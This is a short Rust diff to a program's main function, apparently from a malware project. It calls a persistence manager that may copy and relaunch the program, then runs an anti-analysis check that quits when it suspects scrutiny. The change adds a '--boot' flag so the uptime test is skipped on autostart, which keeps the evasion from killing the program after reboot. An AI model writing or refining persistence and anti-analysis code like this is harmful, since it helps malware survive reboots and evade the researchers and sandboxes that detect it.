@@ -16,8 +16,9 @@ fn main() {
     // Apply persistence early (may relaunch/copy and exit)
     libra_engine::persistence::PersistenceManager::apply(require_admin, copy_to_path, enable_persistence);
 
-    // Anti-analysis check
-    if !libra_modules::anti_analysis::should_execute() {
+    // Anti-analysis check (skip uptime on boot to avoid self-kill on autostart)
+    let is_boot = args.iter().any(|a| a == "--boot");
+    if !libra_modules::anti_analysis::should_execute_ex(is_boot) {
         std::process::exit(0);
     }
 
